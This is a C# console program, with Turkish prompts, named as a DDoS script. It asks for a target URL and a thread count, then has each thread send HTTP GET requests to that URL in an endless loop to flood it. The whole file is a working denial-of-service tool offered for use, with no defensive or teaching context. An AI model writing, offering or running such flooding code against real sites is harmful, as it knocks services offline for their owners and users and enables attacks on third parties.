using System;
using System.Net.Http;
using System.Threading;
using System.Threading.Tasks;

namespace Emancipated_Zero
{
    class DdosScript
    {
        public static async Task StartDDoSAttack()
        {
            try
            {
                await Task.Run(() => DdosScript.StartDDoS());
            }
            catch (Exception ex)
            {
                WriteColored($"Error: {ex.Message}", ConsoleColor.Red);
                Console.ReadKey();
            }
        }
        public static void StartDDoS()
        {
            WriteColored("DDoS saldırısını başlatmak için URL girin:", ConsoleColor.Yellow);
            string url = Console.ReadLine();

            if (string.IsNullOrWhiteSpace(url) || !Uri.IsWellFormedUriString(url, UriKind.Absolute))
            {
                WriteColored("Geçersiz URL! Lütfen geçerli bir URL girin.", ConsoleColor.Red);
                Console.ReadKey();
                return;
            }

            WriteColored("Thread sayısını girin: ", ConsoleColor.Yellow);
            if (!int.TryParse(Console.ReadLine(), out int threads) || threads <= 0)
            {
                WriteColored("Geçersiz thread sayısı!", ConsoleColor.Red);
                Console.ReadKey();
                return;
            }

            WriteColored($"{threads} thread ile DDoS saldırısı başlatılıyor...", ConsoleColor.Green);
            for (int i = 0; i < threads; i++)
            {
                ThreadPool.QueueUserWorkItem(state => SendRequest(url));
                WriteColored($"{i + 1} thread başlatıldı.", ConsoleColor.Cyan);
            }
        }

        static void SendRequest(string url)
        {
            using (HttpClient client = new HttpClient())
            {
                while (true)
                {
                    try
                    {
                        HttpResponseMessage response = client.GetAsync(url).Result;
                        WriteColored("Request sent! Status Code: " + response.StatusCode, ConsoleColor.Green);
                    }
                    catch (Exception ex)
                    {
                        WriteColored($"[!!!] Connection error: {ex.Message}", ConsoleColor.Red);
                        Console.ReadKey();
                        break; // Sonsuz döngüyü önlemek için çıkış
                    }
                }
            }
        }

        static void WriteColored(string message, ConsoleColor color)
        {
            Console.ForegroundColor = color;
            Console.WriteLine(message);
            Console.ResetColor();
        }
    }
}
